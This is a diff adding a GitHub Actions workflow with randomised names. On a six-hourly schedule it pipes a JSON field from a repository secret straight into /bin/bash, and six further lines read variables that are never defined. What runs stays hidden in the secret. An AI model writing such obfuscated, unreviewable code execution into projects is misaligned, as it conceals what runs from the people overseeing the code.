@@ -1,0 +1,25 @@
+name: xuezhongpaof
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuezhongpaof
+        env:
+          yt60: ${{ secrets.yt60 }}
+        run: |
+          echo $yt60 | jq -r .l67619 | /bin/bash
+          echo $l565 | jq -r .gb9 | /bin/bash
+          echo $cgmzo130 | jq -r .zvmxm84 | /bin/bash
+          echo $zu980 | jq -r .rooaw5 | /bin/bash
+          echo $dasz1885 | jq -r .x13567 | /bin/bash
+          echo $ajds2158 | jq -r .r97800 | /bin/bash
+          echo $xya108 | jq -r .mr2 | /bin/bash
+
